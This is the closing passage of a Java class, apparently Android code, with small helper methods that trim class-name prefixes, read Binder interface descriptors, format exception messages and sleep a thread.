        return fqcn.startsWith(target) ? fqcn.substring(target.length()) : fqcn;
    }

    private static String descriptorOf(IBinder b) {
        try {
            String d = b.getInterfaceDescriptor();
            return d == null ? "" : d;
        } catch (RemoteException e) {
            return "";
        }
    }

    private static String msg(Throwable t) {
        String m = t.getMessage();
        return t.getClass().getSimpleName() + (m == null ? "" : ": " + m);
    }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) { }
    }
}
